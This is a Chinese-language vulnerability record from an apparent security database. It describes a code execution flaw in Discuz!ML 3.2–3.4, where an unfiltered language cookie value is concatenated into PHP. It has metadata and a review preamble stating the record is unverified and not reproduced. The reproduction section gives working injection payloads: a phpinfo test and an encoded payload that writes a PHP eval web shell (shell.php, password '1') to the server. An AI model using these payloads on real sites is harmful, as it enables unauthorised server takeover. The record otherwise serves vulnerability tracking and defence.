---
source: "hatch 补库批 20260928"
product: "Discuz!ML fork"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz!ML 3.x 代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：ML3.2–3.4; attacker-controlled language cookie; PHP execution/write permissions"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-90c1fcd7ea95653494cc379b"
entity_id: "ve-90c1fcd7ea95653494cc379b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：ML3.2–3.4; attacker-controlled language cookie; PHP execution/write permissions

- **结论使用边界（1）**：Clearly ML-specific, don't apply to stock Discuz X。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：No request path/source sink/auth or response proof; repo source provided。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（3）**：Encoded shell payload omits sc prefix used by phpinfo example; exact generated-template context needs verification。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz!ML 3.x 代码执行漏洞

一、漏洞简介
------------

漏洞类型：代码执行漏洞漏洞原因：Discuz!ML
系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。

二、影响范围
------------

-   Discuz!ML V3.2-3.4

三、复现过程
------------

cookie字段中会出现xxxx\_xxxx\_language字段，根本原因就是这个字段存在注入，导致的RCE抓包找到cookie的language的值修改为

    xxxx_xxxx_language=sc'.phpinfo().'

getshell

    %27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27

实际为：

    '.+file_put_contents('shell.php',urldecode('<?php eval($_POST["1"]);?>')).'

即可在路径下生成shell.php，连接密码为1

https://github.com/ianxtianxt/discuz-ml-rce
-------------------------------------------
